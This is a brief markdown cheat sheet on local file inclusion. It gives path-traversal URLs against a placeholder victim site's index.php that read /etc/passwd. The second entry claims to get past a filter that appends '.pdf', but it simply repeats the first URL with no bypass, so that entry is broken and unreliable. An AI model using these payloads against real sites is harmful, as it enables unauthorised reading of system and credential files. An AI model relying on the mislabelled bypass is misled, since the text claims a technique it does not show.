# Local File Inclusions

### Simple LFI
```html
http://<victim-site>/index.php?location=../../../etc/passwd
```

### If the LFI vuln sanitizes for .pdf or put that to the end.
```html
http://<victim-site>/index.php?location=../../../etc/passwd
```
